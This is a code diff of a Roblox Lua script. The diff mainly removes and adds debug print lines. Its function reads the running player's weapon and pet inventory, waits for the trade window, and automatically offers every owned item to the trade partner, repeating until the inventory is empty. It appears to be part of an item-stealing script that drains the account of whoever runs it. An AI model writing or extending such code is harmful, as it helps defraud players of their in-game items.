@@ -89,8 +89,7 @@ end
 local function baiiii()
     local tradeGUI = Players.LocalPlayer.PlayerGui.TradeGUI
 
-    local ownedWeapons, ownedPets = inventoryMeow()
-    print(ownedWeapons, ownedPets)
+    ownedWeapons, ownedPets = inventoryMeow()
 
     while not tradeGUI.Enabled do
         if ownedWeapons or ownedPets then
@@ -100,33 +99,23 @@ local function baiiii()
             tradeGUI = Players.LocalPlayer.PlayerGui.TradeGUI
         end
     end
-    print("Trade GUI is open!")
 
     if ownedWeapons or ownedPets then
-        print("if ownedWeapons or ownedPets then")
         local function offerItems(itemType, itemList)
             local args = {
                 [2] = itemType
             }
-            print("1")
             local typesOffered = {}
-            print("2")
             for itemKey, amount in pairs(itemList) do
-                print("3")
                 args[1] = itemKey
                 for _ = 1, amount do
-                    print("4")
                     ReplicatedStorage.Trade.OfferItem:FireServer(unpack(args))
                 end
-                print("5")
                 typesOffered[itemKey] = true
-                print("6")
                 if #typesOffered >= 4 then
-                    print("7")
                     break
                 end
             end
-            print("8")
 
             while tradeGUI and tradeGUI.Enabled do
                 wait()
@@ -135,9 +124,11 @@ local function baiiii()
             end
             return
         end
+        print("911")
         ownedWeapons, ownedPets = inventoryMeow()
 
         if ownedWeapons then
+            print("221")
             if offerItems("Weapons", ownedWeapons) then
                 baiiii()
                 return
@@ -145,6 +136,7 @@ local function baiiii()
         end
 
         if ownedPets then
+            print("331")
             if offerItems("Pets", ownedPets) then
                 baiiii()
                 return
